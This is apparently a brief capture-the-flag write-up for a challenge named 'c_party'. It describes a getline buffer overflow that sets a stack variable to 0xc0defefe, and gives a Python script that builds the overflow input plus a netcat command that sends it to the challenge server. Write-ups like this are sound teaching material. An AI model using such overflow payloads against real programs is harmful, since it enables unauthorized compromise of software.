c_party
=====
* Tools used: IDA Free, GDB, Python, Netcat
* After taking a look at the binary using IDA, we observe that the flag must be printed just before the end of program if some stack variable contains the value `0xc0defefe`. If we inspect the arguments of `getline` we will observe that the allowed input size is bigger than the size of the buffer. Using Python, we could write a script that generates just the right input for the exploit:
```
data = b"a" * 32 + b"\xfe\xfe\xde\xc0" + b"\n"
with open("input.txt", "wb") as f:
    f.write(data)
```
* Run the exploit: nc <remote> <port> < input.txt
